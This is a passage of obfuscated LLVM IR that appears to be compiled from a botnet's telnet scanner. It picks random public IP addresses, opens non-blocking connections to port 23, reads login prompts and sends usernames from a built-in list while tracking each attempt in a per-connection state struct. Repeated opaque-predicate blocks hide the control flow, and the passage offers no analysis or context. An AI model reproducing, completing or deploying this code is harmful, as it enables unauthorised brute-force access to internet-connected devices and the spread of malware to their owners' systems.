  %128 = load i32, i32* @x.91
  %129 = load i32, i32* @y.92
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %136

; <label>:136:                                    ; preds = %originalBBpart237
  store i32 0, i32* %9, align 4
  br label %137

; <label>:137:                                    ; preds = %1188, %136
  %138 = load i32, i32* @x.91
  %139 = load i32, i32* @y.92
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %137
  %146 = load i32, i32* %9, align 4
  %147 = load i32, i32* %17, align 4
  %148 = icmp slt i32 %146, %147
  %149 = load i32, i32* @x.91
  %150 = load i32, i32* @y.92
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br i1 %148, label %157, label %1191

; <label>:157:                                    ; preds = %originalBBpart241
  %158 = load i32, i32* %9, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %159
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %160, i32 0, i32 7
  %162 = load i32, i32* %161, align 16
  %163 = icmp eq i32 %162, 0
  br i1 %163, label %164, label %186

; <label>:164:                                    ; preds = %157
  %165 = load i32, i32* @x.91
  %166 = load i32, i32* @y.92
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %164
  %173 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %175
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %176, i32 0, i32 7
  store i32 %173, i32* %177, align 16
  %178 = load i32, i32* @x.91
  %179 = load i32, i32* @y.92
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %186

; <label>:186:                                    ; preds = %originalBBpart245, %157
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %188
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %189, i32 0, i32 2
  %191 = load i8, i8* %190, align 8
  %192 = zext i8 %191 to i32
  switch i32 %192, label %1171 [
    i32 0, label %193
    i32 1, label %344
    i32 2, label %506
    i32 3, label %599
    i32 4, label %660
    i32 5, label %737
    i32 6, label %782
    i32 7, label %960
  ]

; <label>:193:                                    ; preds = %186
  %194 = load i32, i32* %9, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %195
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %196, i32 0, i32 3
  %198 = load i8, i8* %197, align 1
  %199 = icmp ne i8 %198, 0
  br i1 %199, label %200, label %236

; <label>:200:                                    ; preds = %193
  %201 = load i32, i32* @x.91
  %202 = load i32, i32* @y.92
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %200
  %209 = load i32, i32* %9, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %210
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %211, i32 0, i32 9
  %213 = load i8*, i8** %212, align 8
  store i8* %213, i8** %26, align 8
  %214 = load i32, i32* %9, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %215
  %217 = bitcast %struct.telstate_t* %216 to i8*
  call void @llvm.memset.p0i8.i64(i8* %217, i8 0, i64 32, i32 16, i1 false)
  %218 = load i8*, i8** %26, align 8
  %219 = load i32, i32* %9, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %220
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %221, i32 0, i32 9
  store i8* %218, i8** %222, align 8
  %223 = call i32 @getRandomPublicIP()
  %224 = load i32, i32* %9, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %225
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %226, i32 0, i32 1
  store i32 %223, i32* %227, align 4
  %228 = load i32, i32* @x.91
  %229 = load i32, i32* @y.92
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br label %284

; <label>:236:                                    ; preds = %193
  %237 = load i32, i32* %9, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %238
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %239, i32 0, i32 3
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 0
  br i1 %243, label %244, label %283

; <label>:244:                                    ; preds = %236
  %245 = load i32, i32* %9, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %246
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %247, i32 0, i32 5
  %249 = load i8, i8* %248, align 1
  %250 = add i8 %249, 1
  store i8 %250, i8* %248, align 1
  %251 = load i32, i32* %9, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %252
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %253, i32 0, i32 4
  %255 = load i8, i8* %254, align 2
  %256 = add i8 %255, 1
  store i8 %256, i8* %254, align 2
  %257 = load i32, i32* %9, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %258
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %259, i32 0, i32 5
  %261 = load i8, i8* %260, align 1
  %262 = zext i8 %261 to i64
  %263 = icmp eq i64 %262, 1
  br i1 %263, label %264, label %269

; <label>:264:                                    ; preds = %244
  %265 = load i32, i32* %9, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %266
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %267, i32 0, i32 3
  store i8 1, i8* %268, align 1
  br label %1188

; <label>:269:                                    ; preds = %244
  %270 = load i32, i32* %9, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %271
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %272, i32 0, i32 4
  %274 = load i8, i8* %273, align 2
  %275 = zext i8 %274 to i64
  %276 = icmp eq i64 %275, 1
  br i1 %276, label %277, label %282

; <label>:277:                                    ; preds = %269
  %278 = load i32, i32* %9, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %279
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %280, i32 0, i32 3
  store i8 1, i8* %281, align 1
  br label %1188

; <label>:282:                                    ; preds = %269
  br label %283

; <label>:283:                                    ; preds = %282, %236
  br label %284

; <label>:284:                                    ; preds = %283, %originalBBpart249
  %285 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %285, align 4
  %286 = call zeroext i16 @htons(i16 zeroext 23) #13
  %287 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %286, i16* %287, align 2
  %288 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 3
  %289 = getelementptr inbounds [8 x i8], [8 x i8]* %288, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %289, i8 0, i64 8, i32 4, i1 false)
  %290 = load i32, i32* %9, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %291
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %292, i32 0, i32 1
  %294 = load i32, i32* %293, align 4
  %295 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %296 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %295, i32 0, i32 0
  store i32 %294, i32* %296, align 4
  %297 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %298 = load i32, i32* %9, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %299
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %300, i32 0, i32 0
  store i32 %297, i32* %301, align 16
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %303
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %304, i32 0, i32 0
  %306 = load i32, i32* %305, align 16
  %307 = icmp eq i32 %306, -1
  br i1 %307, label %308, label %309

; <label>:308:                                    ; preds = %284
  br label %1188

; <label>:309:                                    ; preds = %284
  %310 = load i32, i32* %9, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %311
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %312, i32 0, i32 0
  %314 = load i32, i32* %313, align 16
  %315 = load i32, i32* %9, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %316
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %317, i32 0, i32 0
  %319 = load i32, i32* %318, align 16
  %320 = call i32 (i32, i32, ...) @fcntl(i32 %319, i32 3, i8* null)
  %321 = or i32 %320, 2048
  %322 = call i32 (i32, i32, ...) @fcntl(i32 %314, i32 4, i32 %321)
  %323 = load i32, i32* %9, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %324
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %325, i32 0, i32 0
  %327 = load i32, i32* %326, align 16
  %328 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  %329 = call i32 @connect(i32 %327, %struct.sockaddr* %328, i32 16)
  %330 = icmp eq i32 %329, -1
  br i1 %330, label %331, label %339

; <label>:331:                                    ; preds = %309
  %332 = call i32* @__errno_location() #13
  %333 = load i32, i32* %332, align 4
  %334 = icmp ne i32 %333, 115
  br i1 %334, label %335, label %339

; <label>:335:                                    ; preds = %331
  %336 = load i32, i32* %9, align 4
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %337
  call void @reset_telstate(%struct.telstate_t* %338)
  br label %343

; <label>:339:                                    ; preds = %331, %309
  %340 = load i32, i32* %9, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %341
  call void @advance_state(%struct.telstate_t* %342, i32 1)
  br label %343

; <label>:343:                                    ; preds = %339, %335
  br label %1171

; <label>:344:                                    ; preds = %186
  br label %345

; <label>:345:                                    ; preds = %344
  %346 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %18, i32 0, i32 0
  %347 = getelementptr inbounds [16 x i64], [16 x i64]* %346, i64 0, i64 0
  %348 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %347) #5, !srcloc !7
  %349 = extractvalue { i64, i64* } %348, 0
  %350 = extractvalue { i64, i64* } %348, 1
  %351 = trunc i64 %349 to i32
  store i32 %351, i32* %27, align 4
  %352 = ptrtoint i64* %350 to i64
  %353 = trunc i64 %352 to i32
  store i32 %353, i32* %28, align 4
  br label %354

; <label>:354:                                    ; preds = %345
  br label %355

; <label>:355:                                    ; preds = %354
  %356 = load i32, i32* %9, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %357
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %358, i32 0, i32 0
  %360 = load i32, i32* %359, align 16
  %361 = srem i32 %360, 64
  %362 = zext i32 %361 to i64
  %363 = shl i64 1, %362
  %364 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %18, i32 0, i32 0
  %365 = load i32, i32* %9, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %366
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %367, i32 0, i32 0
  %369 = load i32, i32* %368, align 16
  %370 = sdiv i32 %369, 64
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds [16 x i64], [16 x i64]* %364, i64 0, i64 %371
  %373 = load i64, i64* %372, align 8
  %374 = or i64 %373, %363
  store i64 %374, i64* %372, align 8
  %375 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 0
  store i64 0, i64* %375, align 8
  %376 = load i32, i32* %15, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 1
  store i64 %377, i64* %378, align 8
  %379 = load i32, i32* %9, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %380
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %381, i32 0, i32 0
  %383 = load i32, i32* %382, align 16
  %384 = add nsw i32 %383, 1
  %385 = call i32 @select(i32 %384, %struct.__sigset_t* null, %struct.__sigset_t* %18, %struct.__sigset_t* null, %struct.timeval* %19)
  store i32 %385, i32* %10, align 4
  %386 = load i32, i32* %10, align 4
  %387 = icmp eq i32 %386, 1
  br i1 %387, label %388, label %484

; <label>:388:                                    ; preds = %355
  %389 = load i32, i32* @x.91
  %390 = load i32, i32* @y.92
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %388
  store i32 4, i32* %20, align 4
  store i32 0, i32* %21, align 4
  %397 = load i32, i32* %9, align 4
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %398
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %399, i32 0, i32 0
  %401 = load i32, i32* %400, align 16
  %402 = bitcast i32* %21 to i8*
  %403 = call i32 @getsockopt(i32 %401, i32 1, i32 4, i8* %402, i32* %20) #5
  %404 = load i32, i32* %21, align 4
  %405 = icmp ne i32 %404, 0
  %406 = load i32, i32* @x.91
  %407 = load i32, i32* @y.92
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br i1 %405, label %414, label %434

; <label>:414:                                    ; preds = %originalBBpart253
  %415 = load i32, i32* @x.91
  %416 = load i32, i32* @y.92
  %417 = sub i32 %415, 1
  %418 = mul i32 %415, %417
  %419 = urem i32 %418, 2
  %420 = icmp eq i32 %419, 0
  %421 = icmp slt i32 %416, 10
  %422 = or i1 %420, %421
  br i1 %422, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %414
  %423 = load i32, i32* %9, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %424
  call void @reset_telstate(%struct.telstate_t* %425)
  %426 = load i32, i32* @x.91
  %427 = load i32, i32* @y.92
  %428 = sub i32 %426, 1
  %429 = mul i32 %426, %428
  %430 = urem i32 %429, 2
  %431 = icmp eq i32 %430, 0
  %432 = icmp slt i32 %427, 10
  %433 = or i1 %431, %432
  br i1 %433, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %467

; <label>:434:                                    ; preds = %originalBBpart253
  %435 = load i32, i32* @x.91
  %436 = load i32, i32* @y.92
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %434
  %443 = load i32, i32* %9, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %444
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %445, i32 0, i32 0
  %447 = load i32, i32* %446, align 16
  %448 = load i32, i32* %9, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 0
  %452 = load i32, i32* %451, align 16
  %453 = call i32 (i32, i32, ...) @fcntl(i32 %452, i32 3, i8* null)
  %454 = and i32 %453, -2049
  %455 = call i32 (i32, i32, ...) @fcntl(i32 %447, i32 4, i32 %454)
  %456 = load i32, i32* %9, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %457
  call void @advance_state(%struct.telstate_t* %458, i32 2)
  %459 = load i32, i32* @x.91
  %460 = load i32, i32* @y.92
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBBpart268, label %originalBB59alteredBB

originalBBpart268:                                ; preds = %originalBB59
  br label %467

; <label>:467:                                    ; preds = %originalBBpart268, %originalBBpart257
  %468 = load i32, i32* @x.91
  %469 = load i32, i32* @y.92
  %470 = sub i32 %468, 1
  %471 = mul i32 %468, %470
  %472 = urem i32 %471, 2
  %473 = icmp eq i32 %472, 0
  %474 = icmp slt i32 %469, 10
  %475 = or i1 %473, %474
  br i1 %475, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %467
  %476 = load i32, i32* @x.91
  %477 = load i32, i32* @y.92
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %1188

; <label>:484:                                    ; preds = %355
  %485 = load i32, i32* %10, align 4
  %486 = icmp eq i32 %485, -1
  br i1 %486, label %487, label %491

; <label>:487:                                    ; preds = %484
  %488 = load i32, i32* %9, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %489
  call void @reset_telstate(%struct.telstate_t* %490)
  br label %1188

; <label>:491:                                    ; preds = %484
  br label %492

; <label>:492:                                    ; preds = %491
  %493 = load i32, i32* %9, align 4
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %494
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %495, i32 0, i32 7
  %497 = load i32, i32* %496, align 16
  %498 = add i32 %497, 3
  %499 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %500 = icmp ult i32 %498, %499
  br i1 %500, label %501, label %505

; <label>:501:                                    ; preds = %492
  %502 = load i32, i32* %9, align 4
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %503
  call void @reset_telstate(%struct.telstate_t* %504)
  br label %505

; <label>:505:                                    ; preds = %501, %492
  br label %1171

; <label>:506:                                    ; preds = %186
  %507 = load i32, i32* %9, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %508
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %509, i32 0, i32 0
  %511 = load i32, i32* %510, align 16
  %512 = load i32, i32* %15, align 4
  %513 = load i32, i32* %9, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 9
  %517 = load i8*, i8** %516, align 8
  %518 = call i32 @read_until_response(i32 %511, i32 %512, i8* %517, i32 512, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %519 = icmp ne i32 %518, 0
  br i1 %519, label %520, label %553

; <label>:520:                                    ; preds = %506
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %522
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %523, i32 0, i32 9
  %525 = load i8*, i8** %524, align 8
  %526 = call i32 @contains_fail(i8* %525)
  %527 = icmp ne i32 %526, 0
  br i1 %527, label %528, label %548

; <label>:528:                                    ; preds = %520
  %529 = load i32, i32* @x.91
  %530 = load i32, i32* @y.92
  %531 = sub i32 %529, 1
  %532 = mul i32 %529, %531
  %533 = urem i32 %532, 2
  %534 = icmp eq i32 %533, 0
  %535 = icmp slt i32 %530, 10
  %536 = or i1 %534, %535
  br i1 %536, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %528
  %537 = load i32, i32* %9, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %538
  call void @advance_state(%struct.telstate_t* %539, i32 0)
  %540 = load i32, i32* @x.91
  %541 = load i32, i32* @y.92
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %552

; <label>:548:                                    ; preds = %520
  %549 = load i32, i32* %9, align 4
  %550 = sext i32 %549 to i64
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %550
  call void @advance_state(%struct.telstate_t* %551, i32 3)
  br label %552

; <label>:552:                                    ; preds = %548, %originalBBpart276
  br label %1188

; <label>:553:                                    ; preds = %506
  %554 = load i32, i32* @x.91
  %555 = load i32, i32* @y.92
  %556 = sub i32 %554, 1
  %557 = mul i32 %554, %556
  %558 = urem i32 %557, 2
  %559 = icmp eq i32 %558, 0
  %560 = icmp slt i32 %555, 10
  %561 = or i1 %559, %560
  br i1 %561, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %553
  %562 = load i32, i32* %9, align 4
  %563 = sext i32 %562 to i64
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %563
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %564, i32 0, i32 7
  %566 = load i32, i32* %565, align 16
  %567 = add i32 %566, 3
  %568 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %569 = icmp ult i32 %567, %568
  %570 = load i32, i32* @x.91
  %571 = load i32, i32* @y.92
  %572 = sub i32 %570, 1
  %573 = mul i32 %570, %572
  %574 = urem i32 %573, 2
  %575 = icmp eq i32 %574, 0
  %576 = icmp slt i32 %571, 10
  %577 = or i1 %575, %576
  br i1 %577, label %originalBBpart282, label %originalBB78alteredBB

originalBBpart282:                                ; preds = %originalBB78
  br i1 %569, label %578, label %582

; <label>:578:                                    ; preds = %originalBBpart282
  %579 = load i32, i32* %9, align 4
  %580 = sext i32 %579 to i64
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %580
  call void @reset_telstate(%struct.telstate_t* %581)
  br label %582

; <label>:582:                                    ; preds = %578, %originalBBpart282
  %583 = load i32, i32* @x.91
  %584 = load i32, i32* @y.92
  %585 = sub i32 %583, 1
  %586 = mul i32 %583, %585
  %587 = urem i32 %586, 2
  %588 = icmp eq i32 %587, 0
  %589 = icmp slt i32 %584, 10
  %590 = or i1 %588, %589
  br i1 %590, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %582
  %591 = load i32, i32* @x.91
  %592 = load i32, i32* @y.92
  %593 = sub i32 %591, 1
  %594 = mul i32 %591, %593
  %595 = urem i32 %594, 2
  %596 = icmp eq i32 %595, 0
  %597 = icmp slt i32 %592, 10
  %598 = or i1 %596, %597
  br i1 %598, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %1171

; <label>:599:                                    ; preds = %186
  %600 = load i32, i32* @x.91
  %601 = load i32, i32* @y.92
  %602 = sub i32 %600, 1
  %603 = mul i32 %600, %602
  %604 = urem i32 %603, 2
  %605 = icmp eq i32 %604, 0
  %606 = icmp slt i32 %601, 10
  %607 = or i1 %605, %606
  br i1 %607, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %599
  %608 = load i32, i32* %9, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %609
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %610, i32 0, i32 0
  %612 = load i32, i32* %611, align 16
  %613 = load i32, i32* %9, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %614
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %615, i32 0, i32 4
  %617 = load i8, i8* %616, align 2
  %618 = zext i8 %617 to i64
  %619 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %618
  %620 = load i8*, i8** %619, align 8
  %621 = load i32, i32* %9, align 4
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %622
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %623, i32 0, i32 4
  %625 = load i8, i8* %624, align 2
  %626 = zext i8 %625 to i64
  %627 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %626
  %628 = load i8*, i8** %627, align 8
  %629 = call i64 @strlen(i8* %628) #10
  %630 = call i64 @send(i32 %612, i8* %620, i64 %629, i32 16384)
  %631 = icmp slt i64 %630, 0
  %632 = load i32, i32* @x.91
  %633 = load i32, i32* @y.92
  %634 = sub i32 %632, 1
  %635 = mul i32 %632, %634
  %636 = urem i32 %635, 2
  %637 = icmp eq i32 %636, 0
  %638 = icmp slt i32 %633, 10
  %639 = or i1 %637, %638
  br i1 %639, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br i1 %631, label %640, label %644

; <label>:640:                                    ; preds = %originalBBpart290
  %641 = load i32, i32* %9, align 4
  %642 = sext i32 %641 to i64
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %642
  call void @reset_telstate(%struct.telstate_t* %643)
  br label %1188

; <label>:644:                                    ; preds = %originalBBpart290
  %645 = load i32, i32* %9, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %646
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %647, i32 0, i32 0
  %649 = load i32, i32* %648, align 16
